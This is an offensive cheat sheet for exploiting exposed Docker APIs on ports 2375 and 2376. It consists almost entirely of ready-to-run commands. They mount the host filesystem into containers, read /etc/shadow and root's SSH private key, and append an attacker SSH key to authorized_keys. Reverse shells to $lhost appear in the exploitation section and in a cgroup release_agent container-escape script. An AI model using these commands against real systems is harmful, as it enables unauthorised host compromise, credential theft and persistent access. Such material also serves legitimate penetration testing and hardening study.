# Port 2375, 2376 - Docker API

## Table of Contents

- [Enumeration](#enumeration)
- [Container Enumeration](#container-enumeration)
- [Exploitation](#exploitation)
- [Container Escape](#container-escape)

---

## Enumeration

### Nmap

```shell
nmap -sV -sC -p 2375,2376 $rhost
nmap -p 2375 --script docker-version $rhost
```

### Check Docker API

```shell
# Version
curl -s http://$rhost:2375/version | jq

# Info
curl -s http://$rhost:2375/info | jq

# Check if exposed
curl -s http://$rhost:2375/_ping
```

---

## Container Enumeration

### List Containers

```shell
# Running containers
curl -s http://$rhost:2375/containers/json | jq

# All containers (including stopped)
curl -s http://$rhost:2375/containers/json?all=1 | jq
```

### List Images

```shell
curl -s http://$rhost:2375/images/json | jq
```

### Docker CLI Remote

```shell
# Use docker CLI with remote host
docker -H tcp://$rhost:2375 ps
docker -H tcp://$rhost:2375 images
docker -H tcp://$rhost:2375 info
```

---

## Exploitation

### Create Malicious Container

```shell
# Create container with host root mounted
docker -H tcp://$rhost:2375 run -it -v /:/host alpine chroot /host /bin/bash

# Or via API
curl -X POST -H "Content-Type: application/json" \
  http://$rhost:2375/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /etc/shadow"],
    "Binds": ["/:/host"],
    "Privileged": true
  }'
```

### Start Container and Get Output

```shell
# Start container
curl -X POST http://$rhost:2375/containers/<container_id>/start

# Get logs
curl http://$rhost:2375/containers/<container_id>/logs?stdout=1
```

### Reverse Shell

```shell
# Create container with reverse shell
docker -H tcp://$rhost:2375 run -d -v /:/host alpine \
  /bin/sh -c "chroot /host bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
```

### Read Sensitive Files

```shell
# Read /etc/shadow
docker -H tcp://$rhost:2375 run -v /:/host alpine cat /host/etc/shadow

# Read SSH keys
docker -H tcp://$rhost:2375 run -v /:/host alpine cat /host/root/.ssh/id_rsa
```

### Add SSH Key

```shell
# Add your SSH key to root
docker -H tcp://$rhost:2375 run -v /:/host alpine \
  /bin/sh -c "echo 'ssh-rsa AAAA...' >> /host/root/.ssh/authorized_keys"

# Connect
ssh root@$rhost
```

---

## Container Escape

### Privileged Container Escape

```shell
# If inside privileged container
mkdir /tmp/escape
mount -t cgroup -o rdma cgroup /tmp/escape
mkdir /tmp/escape/x
echo 1 > /tmp/escape/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts | head -n1)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/escape/x/cgroup.procs"
```

### Using Docker Socket

```shell
# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `curl http://$rhost:2375/version` | Get Docker version |
| `curl http://$rhost:2375/containers/json` | List containers |
| `docker -H tcp://$rhost:2375 ps` | List containers (CLI) |
| `docker -H tcp://$rhost:2375 run -v /:/host alpine sh` | Mount host filesystem |

| Port | Service | Description |
| :--- | :--- | :--- |
| 2375 | Docker API | Unencrypted |
| 2376 | Docker API | TLS |
